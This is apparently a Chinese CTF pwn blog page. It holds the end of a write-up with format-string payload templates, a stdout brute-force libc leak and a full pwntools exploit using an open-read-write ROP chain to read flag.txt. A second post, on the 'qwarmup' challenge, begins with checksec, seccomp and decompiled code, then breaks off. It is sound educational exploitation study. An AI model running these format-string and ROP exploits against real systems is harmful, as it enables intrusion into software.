<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="string">&quot;[offset]&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line"><span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">    bit=bit+<span class="number">0xf0</span></span><br><span class="line">off=[<span class="string">&quot;[last]&quot;</span>,bit+<span class="string">&quot;(1)&quot;</span>]</span><br><span class="line">ptr=[<span class="string">&quot;[stack]&quot;</span>,<span class="string">&quot;[stack+1]&quot;</span>]</span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    min_num=<span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">        <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">            min_num=off[i]</span><br><span class="line">            min_idx=i</span><br><span class="line">    fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="string">&quot;[index]&quot;</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    data+=p64(ptr[min_idx])</span><br><span class="line">    off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">    pre=min_num</span><br><span class="line"></span><br><span class="line">payload = fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data</span><br></pre></td></tr></table></figure>
<ul>
<li><code>[last]</code>：目标地址的最后1字节</li>
<li><code>[offset]</code>：目标地址的倒数第2字节的偏移（<code>bit</code>为倒数第2字节，并且需要爆破）</li>
<li><code>[stack]</code>：位于 stack 上的指针，指向将要被修改的地址（间接修改）</li>
<li><code>[index]</code>：格式化字符串的偏移（可以用 <code>fmtarg</code> 命令快速获取）</li>
</ul>
<p>由于程序需要在覆盖 <code>_IO_2_1_stdout_</code> 最后两字节的同时，修改 main 的返回地址为 main，所以对这个模板做了些改动：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">start=pie+<span class="number">0x11a0</span></span><br><span class="line">bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="number">0x6</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line"><span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">    bit=bit+<span class="number">0xf0</span></span><br><span class="line">off=[<span class="number">0x10</span>,bit+<span class="number">1</span>]</span><br><span class="line">ptr=[stack-<span class="number">0x80</span>,stack-<span class="number">0x7F</span>]</span><br><span class="line"></span><br><span class="line">tmp=start</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    off.append(tmp%<span class="number">0x100</span>)</span><br><span class="line">    ptr.append(stack-<span class="number">0x1c8</span>+i)</span><br><span class="line">    tmp=tmp//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">pre=<span class="number">0</span></span><br><span class="line">fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">data=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    min_num=<span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">        <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">            min_num=off[i]</span><br><span class="line">            min_idx=i</span><br><span class="line">    fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="number">22</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    data+=p64(ptr[min_idx])</span><br><span class="line">    off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">    pre=min_num</span><br><span class="line"></span><br><span class="line">r.send((fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>当 1/16 的概率爆破成功后，下一次循环的 fmt 就可以修改 <code>_IO_2_1_stdout_-&gt;fileno</code> 为 “2”，然后用 “%p” 就可以泄露出 libc_base</p>
<p>最后就可以通过 buffered_vfprintf 覆盖 printf 的返回地址，把一个特殊的 getget 写入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rsp,<span class="number">0x98</span>; ret;  </span><br></pre></td></tr></table></figure>
<ul>
<li>看看 printf 返回时的 stack 空间：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RSP  <span class="number">0x7ffdb7a886f8</span> —▸ <span class="number">0x7fb53b3e2242</span> (__libc_check_standard_fds+<span class="number">82</span>) ◂— add    rsp, <span class="number">0x98</span></span><br><span class="line">*RIP  <span class="number">0x7fb53b41fd56</span> (<span class="built_in">printf</span>+<span class="number">198</span>) ◂— ret </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffdb7a88700</span>+<span class="number">0x98</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffdb7a88798</span> —▸ <span class="number">0x5591eb4c0543</span> ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffdb7a887a0</span> —▸ <span class="number">0x7ffdb7a88780</span> ◂— <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffdb7a887a8</span> —▸ <span class="number">0x7fb53b3e401f</span> (__gconv_close_transform+<span class="number">239</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffdb7a887b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffdb7a887b8</span> —▸ <span class="number">0x7fb53b4cbce0</span> (open64) ◂— endbr64 </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffdb7a887c0</span> —▸ <span class="number">0x5591eb4c0543</span> ◂— pop    rdi</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffdb7a887c8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffdb7a887d0</span> —▸ <span class="number">0x7fb53b3e401f</span> (__gconv_close_transform+<span class="number">239</span>) ◂— pop    rsi</span><br></pre></td></tr></table></figure>
<ul>
<li>汇编指令 <code>add rsp,0x98; ret;</code> 完美衔接了 ORW 的 ROP 链</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x14B9)\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    stack=<span class="built_in">int</span>(r.recvline(),<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    pro_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)+p16(<span class="number">0</span>))-<span class="number">0x11a0</span></span><br><span class="line">    success(<span class="string">&quot;pro_base: &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">    r.recvline()</span><br><span class="line">    r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xe8</span>:pro_base+<span class="number">0x11a0</span>&#125;).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    start=pro_base+<span class="number">0x11a0</span></span><br><span class="line">    bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="number">0x6</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line">    <span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">        bit=bit+<span class="number">0xf0</span></span><br><span class="line">    off=[<span class="number">0x10</span>,bit+<span class="number">1</span>]</span><br><span class="line">    ptr=[stack-<span class="number">0x80</span>,stack-<span class="number">0x7F</span>]</span><br><span class="line"></span><br><span class="line">    tmp=start</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        off.append(tmp%<span class="number">0x100</span>)</span><br><span class="line">        ptr.append(stack-<span class="number">0x1c8</span>+i)</span><br><span class="line">        tmp=tmp//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    pre=<span class="number">0</span></span><br><span class="line">    fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">    data=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        min_num=<span class="number">0xFFFF</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">            <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">                min_num=off[i]</span><br><span class="line">                min_idx=i</span><br><span class="line">        fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="number">22</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">        data+=p64(ptr[min_idx])</span><br><span class="line">        off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">        pre=min_num</span><br><span class="line"></span><br><span class="line">    r.send((fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;%2c%334$hhn;%334$p&quot;</span>.ljust(<span class="number">0x18</span>)+fmtstr_payload(<span class="number">9</span>, &#123;stack-<span class="number">0x2a8</span>:pro_base+<span class="number">0x11a0</span>&#125;, numbwritten=<span class="number">0x17</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]-<span class="number">112</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(r,cmd)</span></span><br><span class="line">    add_rsp=libc_base+<span class="number">0x24242</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x36174</span></span><br><span class="line">    pop_rdi=pro_base+<span class="number">0x1543</span></span><br><span class="line">    pop_rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">    pop_rdx=libc_base+<span class="number">0x142c92</span></span><br><span class="line">    open_libc=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">    read_libc=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">    write_libc=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">    bss = pro_base+elf.bss()</span><br><span class="line">    payload=p64(pop_rdi)+p64(stack-<span class="number">0xb20</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_libc)</span><br><span class="line">    payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)</span><br><span class="line">    payload+=p64(bss)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(read_libc)</span><br><span class="line">    payload+=p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(bss)+p64(write_libc)</span><br><span class="line"></span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xba8</span>:add_rsp&#125;).ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+<span class="string">&quot;flag.txt&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&quot;\x00&quot;</span>)+payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        success(<span class="string">&quot;wrong&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<p>第一次接触这种 printf 盲打印，学到了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/" class="post-title-link" itemprop="url">dl_runtime_resolve attack+svcudp_reply控制栈</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-23 00:40:46 / Modified: 16:21:14" itemprop="dateCreated datePublished" datetime="2022-08-23T00:40:46+08:00">2022-08-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>21 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>qwarmup 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup file qwarmup          </span><br><span class="line">qwarmup: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">0</span>ee74cf51da29e8ecc9897c2a2a96b4ce87934be, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">➜  qwarmup checksec qwarmup      </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/qwarmup/qwarmup&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，开了 NX，开了 PIE，开了 Canary，但是 GOT 可改（启用了延迟绑定）</li>
</ul>
<p>有沙盒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  qwarmup seccomp-tools dump ./qwarmup1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<ul>
<li>只能打 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> key; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> byte; <span class="comment">// [rsp+7h] [rbp-19h] BYREF</span></span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  _BYTE *chunk; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_s();</span><br><span class="line">  read(<span class="number">0</span>, &amp;size, <span class="number">4uLL</span>);</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk )</span><br><span class="line">    _Exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    offset = <span class="number">0LL</span>;</span><br><span class="line">    byte = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, &amp;offset, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;byte, <span class="number">1uLL</span>);</span><br><span class="line">    chunk[offset] = byte;                       <span class="comment">// 溢出？</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Success!&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">    HIWORD(key) = HIWORD(size);                 <span class="comment">// 大于0x10000的部分赋值key</span></span><br><span class="line">    LOWORD(key) = <span class="number">0</span>;                            <span class="comment">// 小于0x10000的部分置空</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !key );</span><br><span class="line">  _Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>题目中会检查 size：<ul>
<li>如果 size 小于0x10000，可以循环写</li>
<li>如果 size 大于0x10000，只能写一次</li>
</ul>
</li>
</ul>
<p><strong>了解延迟绑定的细节</strong></p>
<p>延迟绑定机制：</p>
<ul>
<li>启用延迟绑定后，程序不会把库函数的真实地址绑定在 GOT 表中</li>
<li>当程序第一次调用该函数时，会先找到该函数对应的 PLT 表，然后跳转对应的 GOT 表</li>
<li>GOT 表中没有该函数的真实地址，而是会跳转回 PLT 表</li>
<li>在 PLT 表中：先 push 一个偏移（用于确定自身函数），然后在 PLT 表中进入共用的 PLT[0] 表</li>
